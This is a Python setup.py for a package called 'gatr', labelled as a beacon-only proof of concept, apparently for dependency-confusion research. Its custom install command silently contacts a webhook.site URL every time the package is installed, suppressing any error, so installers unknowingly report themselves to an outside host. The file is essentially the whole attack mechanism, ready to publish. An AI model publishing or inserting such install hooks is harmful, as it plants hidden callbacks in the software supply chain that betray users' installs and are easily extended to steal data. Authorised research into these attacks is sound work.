from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/abe519dc-d3a0-4547-8869-3775754ce660"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="gatr",
    version="0.0.1",
    packages=["gatr"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
